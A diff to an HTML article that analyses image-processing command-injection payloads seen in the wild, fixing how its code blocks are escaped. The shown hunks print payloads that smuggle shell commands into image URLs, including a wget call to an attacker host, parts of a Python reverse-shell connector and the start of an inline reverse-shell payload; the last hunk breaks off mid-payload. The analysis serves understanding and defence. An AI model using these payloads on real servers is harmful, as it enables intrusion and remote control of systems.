@@ -35,7 +35,8 @@
 someting_by_nebezial-d5cdlor.jpg";curl "example.com)'</code></pre>
 	<p>This particular payload should not cause any damage as the curl command just returns the text of a 301 Moved Permanently HTTP error. The attacker may have been using this as a way of testing whether the exploit worked on a specific website. Once they know that something works they can come back and try to break into the server using a more complex payload.</p>
 	<p>The next payload looks like it might similarly be used for reconnaissance:</p>
-	<pre class="language-bash"><code class="language-bash"><img xlink:href="https://127.0.0.1/image.jpg" |wget="" xx.xx.116.214="" loltest;"="" x="0" y="0" height="140px" width="140px" alt=""></code></pre>
+	<pre class="language-bash"><code class="language-bash">&lt;image xlink:href="https://127.0.0.1/image.jpg"|wget xx.xx.116.214/loltest;" 
+x="0" y="0" height="140px" width="140px"/&gt;</code></pre>
 	<p>The wget command results in a 404 Not Found error (although there might have been a real file downloaded at some point). Even with a 404 error an attacker can look through their own server logs (of the server at xx.xx.116.214) to discover the IP address of any website on which the payload worked. They can then return to the website later to attack it properly.</p>
 	<h3>Remote Access</h3>
 	<p>Another style of payload looks like this:</p>
@@ -65,7 +66,7 @@ shell = "/bin/sh"
 
 def usage(name):
     print 'python reverse connector'
-    print 'usage: %s <ip_addr> <port>' % name
+    print 'usage: %s &lt;ip_addr&gt; &lt;port&gt;' % name
 
 
 def main():    
@@ -87,7 +88,7 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.close()
 
 if __name__ == '__main__':
-    main()</port></ip_addr></code></pre>
+    main()</code></pre>
 	<p>A variant of this payload eliminates the need to download the python program and includes it in the payload itself:</p>
 	<pre class="language-bash"><code class="language-bash">fill 'url(https://example.com/image.jpg"|/bin/echo -e \'import 
 socket\x2csubprocess\x2cos;s=socket.socket(socket.af_inet\x2csocket.sock_stream);
